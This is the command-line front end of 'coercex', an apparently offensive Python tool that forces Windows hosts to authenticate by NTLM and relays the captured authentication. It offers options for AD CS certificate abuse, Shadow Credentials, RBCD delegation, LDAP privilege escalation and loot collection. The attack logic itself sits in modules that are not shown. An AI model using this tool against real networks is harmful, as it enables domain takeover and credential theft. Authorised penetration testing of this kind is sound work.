"""Command-line interface for coercex.

Modern Typer-based CLI with Rich output.  Three subcommands:
  scan   - detect vulnerable methods (all path styles, optional listener)
  coerce - trigger coercion with listener (specific or all methods)
  relay  - coercion + NTLM relay (all path styles through relay servers)
"""

from __future__ import annotations

import asyncio
import logging
import sys
from typing import Annotated, Optional

import typer
from rich.console import Console
from rich.table import Table

from coercex import __version__
from coercex.methods import ALL_PROTOCOLS
from coercex.scanner import Mode, ScanConfig, Scanner
from coercex.utils import Credentials, ScanStats, Transport, TriggerResult

# ── Rich consoles ───────────────────────────────────────────────────
console = Console(stderr=True)
out_console = Console()  # stdout for results

# ── Typer app ───────────────────────────────────────────────────────
app = typer.Typer(
    name="coercex",
    help="Async NTLM authentication coercion scanner & relay tool",
    no_args_is_help=True,
    rich_markup_mode="rich",
    add_completion=False,
)


def _version_callback(value: bool) -> None:
    if value:
        out_console.print(f"coercex {__version__}")
        raise typer.Exit()


@app.callback()
def _main(
    version: Annotated[
        bool,
        typer.Option(
            "--version",
            "-V",
            help="Show version and exit.",
            callback=_version_callback,
            is_eager=True,
        ),
    ] = False,
) -> None:
    """Async NTLM authentication coercion scanner & relay tool."""


# ── Helpers ─────────────────────────────────────────────────────────


def _parse_targets(
    target: str | None,
    targets_file: str | None,
) -> list[str]:
    """Resolve target list from CLI arguments."""
    result: list[str] = []
    if target:
        for t in target.split(","):
            t = t.strip()
            if t:
                result.append(t)
    if targets_file:
        try:
            with open(targets_file) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        result.append(line)
        except FileNotFoundError:
            console.print(f"[bold red]Error:[/] targets file not found: {targets_file}")
            raise typer.Exit(1)
    return result


def _build_creds(
    username: str,
    password: str,
    domain: str,
    hashes: str,
    aes_key: str,
    kerberos: bool,
    dc_host: str,
    ccache: str,
) -> Credentials:
    creds = Credentials(
        username=username,
        password=password,
        domain=domain,
        hashes=hashes,
        aes_key=aes_key,
        do_kerberos=kerberos,
        dc_host=dc_host,
        ccache=ccache,
    )
    if creds.ccache or (creds.do_kerberos and not creds.password and not creds.hashes):
        creds.load_ccache()
    return creds


def _setup_logging(debug: bool) -> None:
    level = logging.DEBUG if debug else logging.INFO
    logging.basicConfig(
        level=level,
        format="%(asctime)s %(name)s %(levelname)s %(message)s",
        datefmt="%H:%M:%S",
        stream=sys.stderr,
    )
    if not debug:
        logging.getLogger("impacket").setLevel(logging.WARNING)


def _parse_transports(transport: list[str] | None) -> set[Transport]:
    """Convert CLI --transport values to a set of Transport enums.

    None or empty → both.  Accepts "smb", "http", or both.
    """
    if not transport:
        return {Transport.SMB, Transport.HTTP}
    result: set[Transport] = set()
    for t in transport:
        t = t.strip().lower()
        if t == "smb":
            result.add(Transport.SMB)
        elif t in ("http", "webdav"):
            result.add(Transport.HTTP)
        else:
            console.print(f"[bold red]Error:[/] unknown transport {t!r} (use smb/http)")
            raise typer.Exit(1)
    return result


# ── Rich output formatters ─────────────────────────────────────────

_STATUS_STYLE = {
    TriggerResult.VULNERABLE: ("bold green", "[+]"),
    TriggerResult.ACCESSIBLE: ("yellow", "[~]"),
    TriggerResult.ACCESS_DENIED: ("red", "[-]"),
    TriggerResult.NOT_AVAILABLE: ("dim", "[ ]"),
    TriggerResult.CONNECT_ERROR: ("bold red", "[!]"),
    TriggerResult.TIMEOUT: ("magenta", "[T]"),
    TriggerResult.UNKNOWN_ERROR: ("dim red", "[?]"),
}


def format_results_table_rich(stats: ScanStats, show_all: bool = False) -> Table:
    """Build a Rich Table of scan results."""
    table = Table(
        title="Coercion Results",
        show_lines=False,
        header_style="bold cyan",
        title_style="bold",
    )
    table.add_column("Target", style="bold")
    table.add_column("Protocol", style="blue")
    table.add_column("Method")
    table.add_column("Pipe", style="dim")
    table.add_column("Result")
    table.add_column("Callback")

    results = stats.results
    if not show_all:
        results = [
            r
            for r in results
            if r.result in (TriggerResult.VULNERABLE, TriggerResult.ACCESSIBLE)
        ]

    for r in results:
        style, sym = _STATUS_STYLE.get(r.result, ("dim red", "[?]"))
        cb = "[bold green]YES[/]" if r.callback_received else ""
        table.add_row(
            r.target,
            r.protocol,
            r.method,
            r.pipe,
            f"[{style}]{sym} {r.result.value}[/]",
            cb,
        )

    return table


def format_results_json(stats: ScanStats, show_all: bool = False) -> str:
    """Format scan results as JSON."""
    import json

    results = stats.results
    if not show_all:
        results = [
            r
            for r in results
            if r.result in (TriggerResult.VULNERABLE, TriggerResult.ACCESSIBLE)
        ]

    data = {
        "summary": {
            "total_targets": stats.total_targets,
            "total_attempts": stats.total_attempts,
            "vulnerable": stats.vulnerable,
            "accessible": stats.accessible,
            "access_denied": stats.access_denied,
            "not_available": stats.not_available,
            "connect_errors": stats.connect_errors,
            "timeouts": stats.timeouts,
        },
        "results": [
            {
                "target": r.target,
                "protocol": r.protocol,
                "method": r.method,
                "pipe": r.pipe,
                "uuid": r.uuid,
                "result": r.result.value,
                "callback_received": r.callback_received,
                "source_ip": r.source_ip,
                "error": r.error,
            }
            for r in results
        ],
    }
    return json.dumps(data, indent=2)


def _print_summary(stats: ScanStats) -> None:
    """Print a Rich summary panel."""
    from rich.panel import Panel

    lines = [
        f"[bold]Targets:[/]        {stats.total_targets}",
        f"[bold]Attempts:[/]       {stats.total_attempts}",
        f"[bold green]Vulnerable:[/]    {stats.vulnerable}",
        f"[yellow]Accessible:[/]    {stats.accessible}",
        f"[red]Access Denied:[/] {stats.access_denied}",
        f"[dim]Not Available:[/] {stats.not_available}",
        f"[bold red]Connect Errors:[/]{stats.connect_errors}",
        f"[magenta]Timeouts:[/]      {stats.timeouts}",
    ]
    console.print(Panel("\n".join(lines), title="Summary", border_style="cyan"))


def _output_results(
    stats: ScanStats,
    json_output: bool,
    verbose: bool,
    output_file: str,
) -> None:
    """Render results to stdout/file."""
    if json_output:
        output = format_results_json(stats, show_all=verbose)
        if output_file:
            with open(output_file, "w") as f:
                f.write(output + "\n")
            console.print(f"Results written to [bold]{output_file}[/]")
        else:
            out_console.print(output)
    else:
        table = format_results_table_rich(stats, show_all=verbose)
        if output_file:
            file_console = Console(file=open(output_file, "w"), width=200)
            file_console.print(table)
            file_console.file.close()
            console.print(f"Results written to [bold]{output_file}[/]")
        else:
            if table.row_count == 0:
                out_console.print("[dim]No vulnerable methods found.[/]")
            else:
                out_console.print(table)

    _print_summary(stats)


# ── Shared option types ─────────────────────────────────────────────

TargetOpt = Annotated[
    Optional[str],
    typer.Option("-t", "--target", help="Target host(s) or IPs, comma-separated"),
]
TargetsFileOpt = Annotated[
    Optional[str],
    typer.Option("-T", "--targets-file", help="File with one target per line"),
]
UsernameOpt = Annotated[str, typer.Option("-u", "--username", help="Username")]
PasswordOpt = Annotated[str, typer.Option("-p", "--password", help="Password")]
DomainOpt = Annotated[str, typer.Option("-d", "--domain", help="Domain")]
HashesOpt = Annotated[
    str, typer.Option("-H", "--hashes", help="NTLM hashes (LMHASH:NTHASH)")
]
AesKeyOpt = Annotated[str, typer.Option("--aes-key", help="AES key for Kerberos")]
KerberosOpt = Annotated[
    bool, typer.Option("-k", "--kerberos", help="Use Kerberos auth")
]
DcHostOpt = Annotated[
    str, typer.Option("--dc-host", help="Domain controller hostname (for Kerberos)")
]
CcacheOpt = Annotated[
    str,
    typer.Option(
        "--ccache", help="Path to Kerberos ccache file (or set KRB5CCNAME env var)"
    ),
]
ProtocolsOpt = Annotated[
    Optional[list[str]],
    typer.Option(
        "--protocols",
        help=f"Filter by protocol(s): {', '.join(ALL_PROTOCOLS)}",
    ),
]
MethodsOpt = Annotated[
    Optional[list[str]],
    typer.Option(
        "--methods",
        "-m",
        help="Filter by method name (glob/regex). E.g. 'RpcRemote*' or 'EfsRpc.*Raw'",
    ),
]
PipesOpt = Annotated[
    Optional[list[str]],
    typer.Option(
        "--pipes",
        help=r"Filter by named pipe. E.g. '\PIPE\spoolss'",
    ),
]
ConcurrencyOpt = Annotated[
    int, typer.Option("-c", "--concurrency", help="Max concurrent tasks")
]
TimeoutOpt = Annotated[
    int, typer.Option("--timeout", help="Connection timeout in seconds")
]
VerboseOpt = Annotated[
    bool,
    typer.Option("-v", "--verbose", help="Show all results, not just vulnerable"),
]
JsonOpt = Annotated[bool, typer.Option("--json", help="Output results as JSON")]
OutputFileOpt = Annotated[
    Optional[str], typer.Option("-o", "--output-file", help="Write results to file")
]
DebugOpt = Annotated[bool, typer.Option("--debug", help="Enable debug logging")]
ListenerOpt = Annotated[
    Optional[str],
    typer.Option(
        "-l",
        "--listener",
        help="Listener IP (attacker IP reachable by targets).",
    ),
]
HttpPortOpt = Annotated[int, typer.Option("--http-port", help="HTTP listener port")]
SmbPortOpt = Annotated[int, typer.Option("--smb-port", help="SMB listener port")]
TransportOpt = Annotated[
    Optional[list[str]],
    typer.Option(
        "--transport",
        help="Coercion transport(s): smb, http, or both (default: both)",
    ),
]
CallbackTimeoutOpt = Annotated[
    float,
    typer.Option("--callback-timeout", help="Seconds to wait for callback per attempt"),
]


# ── scan ────────────────────────────────────────────────────────────


@app.command()
def scan(
    target: TargetOpt = None,
    targets_file: TargetsFileOpt = None,
    listener: ListenerOpt = None,
    http_port: HttpPortOpt = 80,
    smb_port: SmbPortOpt = 445,
    transport: TransportOpt = None,
    callback_timeout: CallbackTimeoutOpt = 3.0,
    username: UsernameOpt = "",
    password: PasswordOpt = "",
    domain: DomainOpt = "",
    hashes: HashesOpt = "",
    aes_key: AesKeyOpt = "",
    kerberos: KerberosOpt = False,
    dc_host: DcHostOpt = "",
    ccache: CcacheOpt = "",
    protocols: ProtocolsOpt = None,
    methods: MethodsOpt = None,
    pipes: PipesOpt = None,
    concurrency: ConcurrencyOpt = 50,
    timeout: TimeoutOpt = 5,
    verbose: VerboseOpt = False,
    json_output: JsonOpt = False,
    output_file: OutputFileOpt = None,
    debug: DebugOpt = False,
) -> None:
    """Detect vulnerable coercion methods by trying all path styles.

    Tries every method/pipe/transport/path-style combination to find
    which RPC methods are vulnerable on each target.

    Starts HTTP + SMB listeners to confirm actual callbacks.
    If -l is not given, the listener IP is auto-detected from the
    default network route.
    """
    _setup_logging(debug)

    targets = _parse_targets(target, targets_file)
    if not targets:
        console.print("[bold red]Error:[/] No targets specified. Use -t or -T.")
        raise typer.Exit(1)

    creds = _build_creds(
        username, password, domain, hashes, aes_key, kerberos, dc_host, ccache
    )

    config = ScanConfig(
        targets=targets,
        mode=Mode.SCAN,
        protocols=protocols,
        methods_filter=methods,
        pipes_filter=pipes,
        creds=creds,
        listener_host=listener or "",
        http_port=http_port,
        smb_port=smb_port,
        callback_timeout=callback_timeout,
        concurrency=concurrency,
        timeout=timeout,
        verbose=verbose,
        transport=_parse_transports(transport),
    )

    stats = asyncio.run(_run(config))
    _output_results(stats, json_output, verbose, output_file or "")


# ── coerce ──────────────────────────────────────────────────────────


@app.command()
def coerce(
    target: TargetOpt = None,
    targets_file: TargetsFileOpt = None,
    listener: Annotated[
        str,
        typer.Option(
            "-l",
            "--listener",
            help="IP of your running relay (e.g. ntlmrelayx). Required.",
        ),
    ] = ...,  # type: ignore[assignment]
    http_port: HttpPortOpt = 80,
    smb_port: SmbPortOpt = 445,
    transport: TransportOpt = None,
    username: UsernameOpt = "",
    password: PasswordOpt = "",
    domain: DomainOpt = "",
    hashes: HashesOpt = "",
    aes_key: AesKeyOpt = "",
    kerberos: KerberosOpt = False,
    dc_host: DcHostOpt = "",
    ccache: CcacheOpt = "",
    protocols: ProtocolsOpt = None,
    methods: MethodsOpt = None,
    pipes: PipesOpt = None,
    concurrency: ConcurrencyOpt = 50,
    timeout: TimeoutOpt = 5,
    verbose: VerboseOpt = False,
    json_output: JsonOpt = False,
    output_file: OutputFileOpt = None,
    debug: DebugOpt = False,
) -> None:
    """Trigger coercion pointing at your external relay.

    Fires RPC calls with UNC paths pointing at --listener, where your
    relay (e.g. ntlmrelayx) is already running.  coercex does NOT bind
    any ports -- it only sends triggers.

    Use --methods / --pipes / --protocols to target specific
    vulnerabilities found during scan. Without filters, tries all methods.
    """
    _setup_logging(debug)

    targets = _parse_targets(target, targets_file)
    if not targets:
        console.print("[bold red]Error:[/] No targets specified. Use -t or -T.")
        raise typer.Exit(1)

    creds = _build_creds(
        username, password, domain, hashes, aes_key, kerberos, dc_host, ccache
    )

    config = ScanConfig(
        targets=targets,
        mode=Mode.COERCE,
        protocols=protocols,
        methods_filter=methods,
        pipes_filter=pipes,
        creds=creds,
        listener_host=listener,
        http_port=http_port,
        smb_port=smb_port,
        transport=_parse_transports(transport),
        concurrency=concurrency,
        timeout=timeout,
        verbose=verbose,
    )

    stats = asyncio.run(_run(config))
    _output_results(stats, json_output, verbose, output_file or "")


# ── relay ───────────────────────────────────────────────────────────


@app.command()
def relay(
    target: TargetOpt = None,
    targets_file: TargetsFileOpt = None,
    listener: ListenerOpt = None,
    relay_to: Annotated[
        list[str],
        typer.Option(
            "--relay-to",
            help="Relay target URL(s): ldap://dc01, http://cas/certsrv/, smb://fs01",
        ),
    ] = ...,  # type: ignore[assignment]
    http_port: HttpPortOpt = 80,
    smb_port: SmbPortOpt = 445,
    transport: TransportOpt = None,
    # Attack options
    adcs: Annotated[
        bool, typer.Option("--adcs", help="Enable AD CS relay attack")
    ] = False,
    template: Annotated[
        str, typer.Option("--template", help="AD CS template name")
    ] = "",
    altname: Annotated[
        str, typer.Option("--altname", help="Subject Alternative Name for ESC1/ESC6")
    ] = "",
    shadow_credentials: Annotated[
        bool,
        typer.Option("--shadow-credentials", help="Enable Shadow Credentials attack"),
    ] = False,
    shadow_target: Annotated[
        str,
        typer.Option("--shadow-target", help="Target account for Shadow Credentials"),
    ] = "",
    delegate_access: Annotated[
        bool,
        typer.Option("--delegate-access", help="Enable RBCD delegation access attack"),
    ] = False,
    escalate_user: Annotated[
        str,
        typer.Option("--escalate-user", help="User to escalate via LDAP ACL attack"),
    ] = "",
    socks: Annotated[
        bool, typer.Option("--socks", help="Start SOCKS proxy for relayed sessions")
    ] = False,
    lootdir: Annotated[
        str, typer.Option("--lootdir", help="Directory to store loot")
    ] = "",
    # Shared options
    username: UsernameOpt = "",
    password: PasswordOpt = "",
    domain: DomainOpt = "",
    hashes: HashesOpt = "",
    aes_key: AesKeyOpt = "",
    kerberos: KerberosOpt = False,
    dc_host: DcHostOpt = "",
    ccache: CcacheOpt = "",
    protocols: ProtocolsOpt = None,
    methods: MethodsOpt = None,
    pipes: PipesOpt = None,
    concurrency: ConcurrencyOpt = 50,
    timeout: TimeoutOpt = 5,
    verbose: VerboseOpt = False,
    json_output: JsonOpt = False,
    output_file: OutputFileOpt = None,
    debug: DebugOpt = False,
) -> None:
    """Trigger coercion and relay captured NTLM auth to target services.

    Starts impacket relay servers (HTTP + SMB on all interfaces),
    then tries all path styles per method.

    --listener is optional; if omitted the local IP is auto-detected.
    Use --methods / --pipes / --protocols to target specific vulnerabilities.
    """
    _setup_logging(debug)

    targets = _parse_targets(target, targets_file)
    if not targets:
        console.print("[bold red]Error:[/] No targets specified. Use -t or -T.")
        raise typer.Exit(1)

    creds = _build_creds(
        username, password, domain, hashes, aes_key, kerberos, dc_host, ccache
    )

    config = ScanConfig(
        targets=targets,
        mode=Mode.RELAY,
        protocols=protocols,
        methods_filter=methods,
        pipes_filter=pipes,
        creds=creds,
        listener_host=listener or "",
        http_port=http_port,
        smb_port=smb_port,
        transport=_parse_transports(transport),
        concurrency=concurrency,
        timeout=timeout,
        verbose=verbose,
        relay_targets=relay_to,
        relay_adcs=adcs,
        relay_adcs_template=template,
        relay_altname=altname,
        relay_shadow_credentials=shadow_credentials,
        relay_shadow_target=shadow_target,
        relay_delegate_access=delegate_access,
        relay_escalate_user=escalate_user,
        relay_socks=socks,
        relay_lootdir=lootdir,
    )

    stats = asyncio.run(_run(config))
    _output_results(stats, json_output, verbose, output_file or "")


# ── Runner ──────────────────────────────────────────────────────────


async def _run(config: ScanConfig) -> ScanStats:
    """Async entry point for the scanner."""
    scanner = Scanner(config, console=console)
    return await scanner.run()


# ── Typer entry point ───────────────────────────────────────────────


def main() -> None:
    """Entry point wrapper for ``python -m coercex``."""
    app()


if __name__ == "__main__":
    main()
